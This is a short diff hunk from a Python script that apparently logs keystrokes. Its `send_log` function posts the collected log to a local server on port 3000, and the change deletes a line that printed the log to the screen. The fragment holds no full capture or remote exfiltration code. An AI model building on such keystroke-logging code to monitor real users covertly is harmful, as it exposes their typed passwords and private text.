@@ -16,7 +16,6 @@ def send_log():
 
     response = requests.post('http://localhost:3000', data = info)
     print(response)
-    print(log)
     log = ""
 
 def key_caption(key):
